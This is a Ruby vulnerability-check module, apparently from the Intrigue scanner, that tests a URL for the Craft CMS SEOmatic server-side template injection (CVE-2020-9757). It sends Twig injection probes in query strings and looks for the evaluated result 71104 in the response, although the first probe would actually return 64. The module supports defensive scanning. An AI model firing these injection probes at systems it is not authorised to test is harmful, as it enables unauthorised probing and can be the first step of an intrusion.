module Intrigue
  module Task
  class CraftCmsSeomaticCve20209757 < BaseTask
  
    def self.metadata
      {
        :name => "vuln/craft_cms_seomatic_cve_2020_9757",
        :pretty_name => "Vuln Check - Craft CMS SEOmatic < 3.3.0 Server-Side Template Injection",
        :authors => ["jcran"],
        :type => "vuln_check",
        :passive => false,
        :allowed_types => ["Uri"],
        :example_entities => [{"type" => "Uri", "details" => {"name" => "https://intrigue.io"}}],
        :allowed_options => [],
        :created_types => []
      }
    end
  
    ## Default method, subclasses must override this
    def run
      super
      
      require_enrichment

      vuln_paths = [
        "/actions/seomatic/meta-container/meta-link-container/?uri={{8*'8'}}",
        "/actions/seomatic/meta-container/all-meta-containers?uri={{8888*'8'}}"
      ] 
      vuln_paths.each do |vp|
        body = http_get_body "#{_get_entity_name}#{vp}"
        
        if body =~ /71104/
          _create_linked_issue "craft_cms_seomatic_cve_2020_9757", { "proof" => body }
        else 
          _log "Not vulnerable? Got: #{body}"
        end
      end

    end
  
   
  end
  end
  end
  